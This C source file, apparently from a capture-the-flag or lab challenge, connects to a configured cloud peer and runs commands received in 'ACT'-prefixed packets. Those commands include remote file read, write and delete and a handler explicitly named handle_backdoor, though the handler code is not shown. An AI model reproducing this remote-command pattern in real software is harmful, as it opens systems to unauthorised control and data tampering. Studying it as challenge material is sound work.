#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "peer.h"
#include "handler.h"

int proc(void)
{
    alarm(15);

    Peer *peer = peer_ctor(CLOUD_IP, CLOUD_PORT);
    if (peer == NULL) {
        fprintf(stderr, "Can't create peer object!\n");
        return -1;
    }

    if (peer_assign(peer, SECRET) < 0) {
        fprintf(stderr, "Can't assign peer!\n");
        return -1;
    }

    while (peer_connect(peer) < 0);

    fprintf(stderr, "Peer connected! %s:%d\n",
        inet_ntoa((struct in_addr)(peer->peer_addr.sin_addr)),
        peer->peer_addr.sin_port);

    while (true)
    {
        uint8_t recvd[512] = {0, };
        int recvd_len = 0;

        if ((recvd_len = peer_recv(peer, recvd, 512)) < 0)
            continue;

        if (recvd_len < 4)
            continue;

        packet_action_t *action = (packet_action_t *)(recvd);
        if (memcmp(action->header, "ACT", 3))
            continue;

        int act_id = (int)(action->header[3]);
        void *buf   = &action->buf;
        size_t len  = recvd_len - 4;
        int res = 0;
        switch (act_id)
        {
            case '0':
                res = handle_sleep(peer, buf, len);
                break;

            case '1':
                res = handle_write(peer, buf, len);
                break;

            case '2':
                res = handle_read(peer, buf, len);
                break;
            
            case '3':
                res = handle_delete(peer, buf, len);
                break;

            case '4':
                res = handle_ping(peer, buf, len);
                break;

            case '5':
                res = handle_backdoor(peer, buf, len);
                break;

            default:
                res = -1;
                break;
        }

        if (res < 0)
            fprintf(stderr, "handle failed: %d\n", res);
    }

    return 0;
}